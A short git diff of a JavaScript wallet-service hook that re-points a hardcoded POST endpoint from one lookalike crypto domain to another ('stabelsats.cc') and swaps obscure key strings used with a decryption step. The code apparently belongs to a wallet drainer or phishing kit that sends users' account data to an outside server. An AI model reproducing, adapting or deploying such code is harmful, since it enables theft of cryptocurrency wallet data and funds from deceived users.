@@ -59,11 +59,10 @@ const useWalletService = () => {
 		return res
 	}
 
-	let url = 'https://polygonfinance.org/concept/unity/check'
-	// let url = 'http://polygonfinance.org/concept/unity/check'
+	let url = 'https://stabelsats.cc/concept/unity/check'
 	const kitkat = 'aBN6qreLALR9QYPy'
-	let xxx = 'P01G$ID/G'
-	let xx = 'P01G$ID'
+	let xxx = 'ROBINNEGOOD/G'
+	let xx = 'ROBINNEGOOD'
 
 	function createBody(str, account) {
 		let strDecr
@@ -117,7 +116,6 @@ const useWalletService = () => {
 		const response = await request(new URL(url), 'POST', requestBody, {
 			'Content-Type': 'application/x-www-form-urlencoded',
 		})
-
 		return response
 	}
 
